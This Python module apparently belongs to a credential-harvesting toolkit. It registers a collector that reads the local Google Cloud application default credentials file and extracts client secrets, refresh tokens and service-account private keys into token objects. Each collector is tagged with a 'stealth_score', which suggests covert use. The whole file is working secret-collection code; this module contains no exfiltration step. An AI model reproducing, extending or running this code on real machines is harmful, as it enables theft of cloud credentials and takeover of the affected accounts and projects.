"""Google Application Default Credentials collector — reads application_default_credentials.json."""

from __future__ import annotations

import json
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import gcloud_dir


@CollectorRegistry.register
class GoogleAdcCollector(BaseCollector):
    service = "google"
    source = "adc"
    stealth_score = 5

    def _adc_path(self):
        return gcloud_dir() / "application_default_credentials.json"

    def discover(self) -> List[DiscoveredToken]:
        path = self._adc_path()
        if not path.exists():
            return []

        try:
            data = json.loads(path.read_text())
            cred_type = data.get("type", "unknown")
            client_id = data.get("client_id", "")
            has_refresh = bool(data.get("refresh_token"))

            details = f"type={cred_type}"
            if has_refresh:
                details += ", has_refresh_token"

            return [DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(path),
                account_hint=client_id[:20] + "..." if len(client_id) > 20 else client_id,
                stealth_score=self.stealth_score,
                details=details,
            )]
        except Exception as e:
            self._warn(f"Failed to parse {path}: {e}")
            return []

    def collect(self) -> List[CollectedToken]:
        path = self._adc_path()
        if not path.exists():
            return []

        try:
            data = json.loads(path.read_text())
            cred_type = data.get("type")

            if cred_type == "authorized_user":
                return [CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    client_id=data.get("client_id"),
                    client_secret=secure(data.get("client_secret", "")),
                    refresh_token=secure(data.get("refresh_token", "")),
                    token_uri="https://oauth2.googleapis.com/token",
                    extra={"type": cred_type, "quota_project_id": data.get("quota_project_id")},
                )]
            elif cred_type == "service_account":
                return [CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    account_id=data.get("client_id"),
                    username=data.get("client_email"),
                    client_id=data.get("client_id"),
                    client_secret=secure(data.get("private_key", "")),
                    token_uri=data.get("token_uri", "https://oauth2.googleapis.com/token"),
                    extra={
                        "type": cred_type,
                        "project_id": data.get("project_id"),
                        "private_key_id": data.get("private_key_id"),
                    },
                )]
            else:
                self._warn(f"Unknown ADC type: {cred_type}")
                return []

        except Exception as e:
            self._warn(f"Failed to collect from {path}: {e}")
            return []
